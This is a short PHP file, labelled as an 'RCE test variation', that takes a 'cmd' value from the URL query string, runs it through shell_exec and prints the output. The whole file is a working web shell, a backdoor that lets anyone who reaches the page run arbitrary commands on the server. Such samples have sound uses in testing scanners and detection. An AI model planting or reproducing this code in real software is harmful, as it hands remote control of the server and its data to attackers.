<?php
// RCE test variation #46
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>